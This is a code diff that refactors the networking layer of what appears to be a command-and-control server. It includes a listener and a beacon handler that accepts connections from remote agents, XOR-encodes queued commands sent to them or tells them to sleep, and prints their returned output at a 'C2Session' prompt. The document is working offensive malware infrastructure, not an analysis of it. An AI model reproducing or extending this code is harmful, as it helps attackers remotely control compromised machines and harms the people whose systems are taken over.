@@ -14,46 +14,36 @@ int NetInit(void)
 {
 #ifdef _WIN32
     WSADATA Wsa;
-    if (WSAStartup(MAKEWORD(2, 2), &Wsa) != 0) {
-        fprintf(stderr, "[!] WSAStartup failed.\n");
+    if (WSAStartup(MAKEWORD(2, 2), &Wsa) != 0)
         return 0;
-    }
 #endif
     return 1;
 }
 
-void NetCleanup(void)
+void NetShutdown(void)
 {
 #ifdef _WIN32
     WSACleanup();
 #endif
 }
 
-NetSocket NetCreateListener(const char *BindAddr, int Port)
+NetSock NetListen(const char *Addr, int Port)
 {
-    NetSocket Sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (Sock == NetInvalid) {
-        fprintf(stderr, "[!] Failed to create socket.\n");
+    NetSock Sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (Sock == NetInvalid)
         return NetInvalid;
-    }
 
-    int Reuse = 1;
-    setsockopt(Sock, SOL_SOCKET, SO_REUSEADDR, (const char *)&Reuse, sizeof(Reuse));
+    int Opt = 1;
+    setsockopt(Sock, SOL_SOCKET, SO_REUSEADDR, (const char *)&Opt, sizeof(Opt));
 
-    struct sockaddr_in Addr;
-    memset(&Addr, 0, sizeof(Addr));
-    Addr.sin_family      = AF_INET;
-    Addr.sin_addr.s_addr = inet_addr(BindAddr);
-    Addr.sin_port        = htons((unsigned short)Port);
+    struct sockaddr_in Sin;
+    memset(&Sin, 0, sizeof(Sin));
+    Sin.sin_family      = AF_INET;
+    Sin.sin_addr.s_addr = inet_addr(Addr);
+    Sin.sin_port        = htons((unsigned short)Port);
 
-    if (bind(Sock, (struct sockaddr *)&Addr, sizeof(Addr)) < 0) {
-        fprintf(stderr, "[!] Bind failed on %s:%d\n", BindAddr, Port);
-        NetClose(Sock);
-        return NetInvalid;
-    }
-
-    if (listen(Sock, 8) < 0) {
-        fprintf(stderr, "[!] Listen failed.\n");
+    if (bind(Sock, (struct sockaddr *)&Sin, sizeof(Sin)) < 0 ||
+        listen(Sock, 16) < 0) {
         NetClose(Sock);
         return NetInvalid;
     }
@@ -61,61 +51,71 @@ NetSocket NetCreateListener(const char *BindAddr, int Port)
     return Sock;
 }
 
-void NetSetNonBlocking(NetSocket Sock)
+void NetNonBlock(NetSock Sock)
 {
 #ifdef _WIN32
-    unsigned long Flag = 1;
-    ioctlsocket(Sock, FIONBIO, &Flag);
+    unsigned long F = 1;
+    ioctlsocket(Sock, FIONBIO, &F);
 #else
     fcntl(Sock, F_SETFL, fcntl(Sock, F_GETFL, 0) | O_NONBLOCK);
 #endif
 }
 
-int NetHandleBeacon(NetSocket Listener, AgentSession *Session)
+void NetHandleBeacon(NetSock Listener, Session *S)
 {
-    struct sockaddr_in AgentAddr;
-    socklen_t          AddrSize = sizeof(AgentAddr);
+    struct sockaddr_in Peer;
+    socklen_t          PeerLen = sizeof(Peer);
 
-    NetSocket AgentSock = accept(Listener, (struct sockaddr *)&AgentAddr, &AddrSize);
-    if (AgentSock == NetInvalid)
-        return 0;
+    NetSock Conn = accept(Listener, (struct sockaddr *)&Peer, &PeerLen);
+    if (Conn == NetInvalid)
+        return;
 
-    char Buf[BufferSize] = {0};
-    int  Received        = recv(AgentSock, Buf, BufferSize - 1, 0);
+    char Buf[BufSize] = {0};
+    int  N            = recv(Conn, Buf, BufSize - 1, 0);
 
-    if (Received <= 0) {
-        NetClose(AgentSock);
-        return 1;
+    if (N <= 0) {
+        NetClose(Conn);
+        return;
     }
 
-    Buf[Received] = '\0';
-    ApplyXor(Buf, (size_t)Received);
-    memcpy(Session->LastResult, Buf, (size_t)Received);
-    Session->LastResult[Received] = '\0';
+    Buf[N] = '\0';
+    ApplyXor(Buf, (size_t)N);
 
-    SessionRegister(Session, inet_ntoa(AgentAddr.sin_addr));
+    SessionRegister(S, inet_ntoa(Peer.sin_addr));
 
-    if (Session->CommandPending && strlen(Session->PendingCommand) > 0) {
-        size_t CmdLen = strlen(Session->PendingCommand);
-        ApplyXor(Session->PendingCommand, CmdLen);
-        send(AgentSock, Session->PendingCommand, (int)CmdLen, 0);
-        memset(Session->PendingCommand, 0, BufferSize);
-        Session->CommandPending = 0;
-        Session->WaitingResult  = 1;
+    if (S->HasPending) {
+        size_t CmdLen = strlen(S->Pending);
+        char   Enc[BufSize];
+        memcpy(Enc, S->Pending, CmdLen);
+        ApplyXor(Enc, CmdLen);
+        send(Conn, Enc, (int)CmdLen, 0);
+
+        memset(S->LastOutput, 0, BufSize);
+        memcpy(S->LastOutput, Buf, (size_t)N);
+
+        if (S->Interactive && strcmp(Buf, "Standby") != 0) {
+            printf("\n[Output]\n%s\n", S->LastOutput);
+            printf("C2Session[%s]> ", S->Address);
+            fflush(stdout);
+        }
+
+        memset(S->Pending, 0, BufSize);
+        S->HasPending = 0;
+
     } else {
         char Sleep[] = "SLEEP";
-        size_t SleepLen = strlen(Sleep);
-        ApplyXor(Sleep, SleepLen);
-        send(AgentSock, Sleep, (int)SleepLen, 0);
+        size_t SLen  = strlen(Sleep);
+        ApplyXor(Sleep, SLen);
+        send(Conn, Sleep, (int)SLen, 0);
+
+        memcpy(S->LastOutput, Buf, (size_t)N);
+
+        if (S->Interactive && strcmp(Buf, "Standby") != 0) {
+            printf("\n[Output]\n%s\n", S->LastOutput);
+            printf("C2Session[%s]> ", S->Address);
+            fflush(stdout);
+        }
     }
 
-    if (Session->InSession && Session->WaitingResult) {
-        printf("\n[AgentResponse]\n%s\n", Session->LastResult);
-        printf("C2Session[%s]> ", Session->Address);
-        fflush(stdout);
-        Session->WaitingResult = 0;
-    }
-
-    NetClose(AgentSock);
-    return 1;
+    NetClose(Conn);
 }
